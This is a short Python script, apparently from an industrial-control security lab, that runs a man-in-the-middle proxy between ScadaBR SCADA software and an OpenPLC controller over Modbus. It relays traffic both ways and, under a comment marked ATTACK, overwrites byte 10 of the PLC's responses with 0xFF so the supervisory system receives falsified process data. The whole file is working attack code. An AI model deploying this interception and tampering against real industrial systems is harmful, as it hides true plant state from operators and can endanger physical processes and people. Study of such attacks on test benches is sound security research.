import socket
import threading

PLC_HOST = "127.0.0.1"
PLC_PORT = 502      # Real OpenPLC
MITM_PORT = 1502    # ScadaBR connects here

def forward(src, dst, label):
    while True:
        data = src.recv(4096)
        if not data:
            break
        print(f"[{label}] {len(data)} bytes")
        # ATTACK: modify data coming from the PLC
        if label == "PLC -> SCADA" and len(data) > 10:
            data = bytearray(data)
            print(f"Byte 10 before: {data[10]:02x}")
            # We change a value (simple example)
            data[10] = 0xFF
            data = bytes(data)
            print(f"Byte 10 after:  {data[10]:02x}")
            print("DATA MODIFIED!")
        dst.sendall(data)

def handle_scada(scada_socket):
    plc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    plc_socket.connect((PLC_HOST, PLC_PORT))
    threading.Thread(target=forward, args=(scada_socket, plc_socket, "SCADA -> PLC")).start()
    threading.Thread(target=forward, args=(plc_socket, scada_socket, "PLC -> SCADA")).start()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", MITM_PORT))
server.listen(1)
print("[+] MITM running on port 1502")
scada_socket, _ = server.accept()
print("[+] ScadaBR connected")
handle_scada(scada_socket)